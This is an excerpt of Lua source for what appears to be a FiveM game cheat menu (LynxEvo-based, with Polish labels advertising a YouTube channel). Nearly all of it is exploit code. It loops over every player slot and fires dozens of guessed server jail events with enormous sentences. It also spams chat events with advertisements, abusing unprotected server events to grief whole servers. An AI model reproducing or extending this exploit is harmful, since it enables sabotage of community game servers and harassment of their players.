        ...
        function()
            for bD = 0, 9 do
                TriggerServerEvent(
                    ...
                    'ZAPRASZAM NA KANAŁ THEULANI',
                    {
                        141,
                        211,
                        255
                    },
                    '^' .. bD .. 'ZAPRASZAM NA KANAŁ THEULANI'
                )
            end
            for i = 0, 128 do
        ...
        while bw do
            ...
            if blowall then
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        '/ooc ZAPRASZAM NA KANAŁ THEULANI',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. '/ooc ZAPRASZAM NA KANAŁ THEULANI'
                    )
                end
                for i = 0, 256 do
                    Citizen.Wait(500)
...
Citizen.CreateThread(
    function()
        ...
        LynxEvo.SetSubTitle('xAriess', 'TheUlani is The Best')
        ...
        while bw do
            ...
            if LynxEvo.IsMenuOpened('xAriess') then
                ...
                av('THEULANI KOCHA WAS', false)
                av('kysss', false)
                if LynxEvo.MenuButton('~h~~p~#~s~ Opcje Własne', 'SelfMenu') then
                elseif LynxEvo.MenuButton('~h~~p~#~s~ Online Gracze', 'OnlinePlayerMenu') then
                elseif LynxEvo.MenuButton('~h~~p~#~s~ Teleportacja', 'TeleportMenu') then
                elseif LynxEvo.MenuButton('~h~~p~#~s~ Samochody', 'VehicleMenu') then
                elseif LynxEvo.MenuButton('~h~~p~#~s~ Bronie', 'WeaponMenu') then
                elseif LynxEvo.MenuButton('~h~~p~#~s~ Triggery ~o~~h~', 'LuaMenu') then
                elseif LynxEvo.MenuButton('~h~~p~#~s~ Jebanie Serwera ~o~~h~', 'AdvM') then
                elseif LynxEvo.MenuButton('~h~~p~# ~y~Zapraszam Na Kanał TheUlani', 'crds') then
                end
                LynxEvo.Display()
            ...
            elseif LynxEvo.IsMenuOpened('PlayerOptionsMenu') then
				...
				TriggerServerEvent("esxjailer:sendToJail2", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent('esx:wiezienie', GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("arisonarp:wiezienie",  GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("esx_jail:sendTooJail", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("esxjailer:sendTooJail", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 9995345349999999)
                TriggerServerEvent("esx_jaler:sendToWiezz", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 9995345349999999)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 9995345349999999)
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 9995345349999999)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI")
				TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI")
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI")
				TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("luki_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 99999 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "ZAPRASZAM NA KANAŁ THEULANI")
				TriggerServerEvent("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 1,2137)
				TriggerServerEvent("esxjailer:sendToJail2", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent('esx:wiezienie', GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("arisonarp:wiezienie",  GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("esx_jail:sendTooJail", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("esxjailer:sendTooJail", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
                TriggerServerEvent("esx_jaler:sendToWiezz", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 9999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 9999)
            ...
            elseif LynxEvo.IsMenuOpened('Destroyer') then
                ...
                elseif LynxEvo.Button('~h~~r~Jail~s~ All players') then
                    for i = 0, 256 do
				--TriggerServerEvent("wysparp_tablet:SendMessage", GetPlayerServerId(i), 9999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99999)	
                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9999 * 60, "TheUlani Pozdrawia Eryka, jail na jego prośbe", 1999)
                TriggerServerEvent("esx_jailer:serverrequest", GetPlayerServerId(i), 989 * 60, "MEDUZA CWEL THEULANI ON YT", 999, policjant)
                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9999 * 60, "TheUlani Pozdrawia Eryka, jail na jego prośbe", 999)
				...
				TriggerServerEvent("esx_jailer:pierdl", GetPlayerServerId(i), 3000)
				TriggerServerEvent("esx_jailer:sendToJailariesfrajerze", GetPlayerServerId(i), 2343243242432, "ZAPRASZAM NA KANAŁ THEULANI", 325325325325433253)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 2343243242432, "ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent('esx_jailer:pierdl', GetPlayerServerId(i), 3000)
				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), 3000)
				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULAN", 332400)
				TriggerServerEvent('esx_jailer:jebacczitera', GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULAN", 302340)
				TriggerServerEvent('esx-qalle-jail:jailPlayer200396', GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent('esx_jailer:wpierdoldopaki', GetPlayerServerId(i), 9937,"ZAPRASZAM NA KANAŁ THEULAN", 303240)
				TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULAN", 303240)
				TriggerServerEvent('esx_jailer:sendToJailf', GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULAN", 303240)
				TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULAN", 303240)
				TriggerServerEvent("OUJQNE89CBHVYIIUNJHio34ulhs", GetPlayerServerId(i), 235325235, "ZAPRASZAM NA KANAŁ THEULAN", 32432432432, securityToken)
				TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 99243237, "ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent("wyspa_jail:SendMessage2", GetPlayerServerId(i), 94324937, "ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent('esx_jailer:sendToJaill', GetPlayerServerId(i), 9923432437, "ZAPRASZAM NA KANAŁ THEULAN", 300)
				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), "ZAPRASZAM NA KANAŁ THEULAN", 300)
				TriggerServerEvent("bmjzjadezwsixqucenasqvfxofbgdm:rmlhrtrlqynnxqyjalwgnqmogicmpo", GetPlayerServerId(i), 9923432437, "ZAPRASZAM NA KANAŁ THEULAN", 3004)
				TriggerServerEvent("esx_jailer:pierdl", GetPlayerServerId(i), 3000)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULAN", 300)
				TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 921937, "ZAPRASZAM NA KANAŁ THEULAN", 59823751)
				TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 921937)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."ZAPRASZAM NA KANAŁ THEULAN")
				TriggerServerEvent("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 9999 * 60, "TEST", 1,2137)
				TriggerServerEvent("esxjailer:sendToJail2", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent('esx:wiezienie', GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
                TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "ZAPRASZAM NA KANAŁ THEULANI", 1)
				...
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99953)
				TriggerServerEvent("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 9999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 9999)
				TriggerServerEvent("esx_jailer:paka", GetPlayerServerId(i), 99999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 9999, policjant)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 99999)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 999 * 60, "ZAPRASZAM NA KANAŁ THEULANI", 9999)
				TriggerServerEvent("pantaT_EmS2:SendMessage", GetPlayerServerId(i), 123132, "THEULANI POZDRAWIA")				end
...
RegisterCommand(
    ...
    function(eA, eB, eC)
        ...
        AmbulancePlayers()
        for i = 0, 128 do
            TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 5000, 'KANAŁ THEULANI NA YOUTUBE')
            ...
            TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'KANAŁ THEULANI NA YOUTUBE')
        end
    end,
    false
)
